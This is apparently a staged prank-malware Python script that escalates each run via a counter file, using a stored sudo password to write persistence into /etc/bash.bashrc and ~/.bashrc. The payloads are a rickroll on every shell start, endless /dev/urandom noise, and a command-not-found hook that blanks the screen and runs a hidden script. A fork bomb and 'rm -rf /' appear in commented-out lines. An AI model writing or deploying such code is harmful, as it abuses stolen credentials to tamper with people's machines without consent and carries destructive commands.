import os

dir = os.path.dirname(os.path.abspath(__file__))

with open (dir+'/p', "r") as pwd:
    password = pwd.readline()
    pwd.close()

def zero():
    '''Harmless messages!'''
    with open(dir+'/1') as spam:
        for i in spam.readlines(): input(i)

def one(no):
    '''Harmless error messages!'''
    with open(dir+'/2') as spam: print(spam.readlines()[no])

def two(): 
    '''Rickrolling: swwet and harmless
    Also activates on bash startup'''
    os.system('sudo -p "" -S <<< ' + password + """ sh -c 'echo "python3 -m webbrowser -t '''https://www.youtube.com/watch?v=dQw4w9WgXcQ'''" >> /etc/bash.bashrc'""")
    os.system('python -m webbrowser -t "https://www.youtube.com/watch?v=dQw4w9WgXcQ"')
    with open(dir+'/3') as spam:
        for line in spam.readlines():
            input(line)

def three(): 
    '''Just white noise, works like the rick roll'''
    os.system('sudo -p "" -S <<< ' + password + """  echo 'if [ -z "$(ps aux | grep aplay)" ]; then aplay /dev/urandom &> /dev/null & true; fi;' >> ~/.bashrc""")
    os.system('''aplay /dev/urandom &> /dev/null & true;''')
    input("Noisy, eh?")

def four():
    '''Flickering display...uh it's still fine?'''
    os.system('sudo -p "" -S <<< ' + password + ''' echo 'function command_not_found_handle { xset -display :0.0 dpms force off; sleep 8s; xset -display :0.0 dpms force on; python3 ~/.config/gtk-3.0/beta/hell_world.py; }' >> ~/.bashrc''')
    os.system("xset -display :0.0 dpms force off; sleep 13s; xset -display :0.0 dpms force on")
    input("Scared you there, didn't I?")
    input("On, and off, and on, and off...")

def five():
    '''Forkbomb. Erm.'''
    with open(dir+'/4') as spam: 
        for i in spam.readlines(): input(i)
    # DEADLY COMMAND COMMENTED OUT HERE
    #os.system('sudo -p "" -S <<< ' + password + " :(){ :|:& };:")

def six():
    '''WHAT DO YOU MEAN IT DELETES ALL THE FILES'''
    with open(dir+'/5') as spam:
        for i in spam.readlines(): input(i)
    # DEADLY COMMAND COMMENTED OUT HERE
    #os.system('sudo -p "" -S <<< ' + password + " rm -rf /")

if os.path.exists(dir+"/counter"):
    with open(dir+"/counter", 'r') as count:
        num = count.readline().strip('\n')
        count.close()
    #run corresponding functions according to counter
    if num == '0': zero()
    elif num == '1': one(0)
    elif num == '2': one(1)
    elif num == '3': one(2)
    elif num == '4': one(3)
    elif num == '5': one(4)
    elif num == '6': one(5)
    elif num == '7': one(6)
    elif num == '8': two()
    elif num == '9': three()
    elif num == '10': four()
    os.remove(dir+'/counter')
    with open(dir+"/counter", 'w') as newcount: newcount.write(str(int(num.replace('\x00','')) + 1))
    if num == '11': five()
    elif num == '12': six()
else:
    os.system("python3 " + dir + "/setup.py")
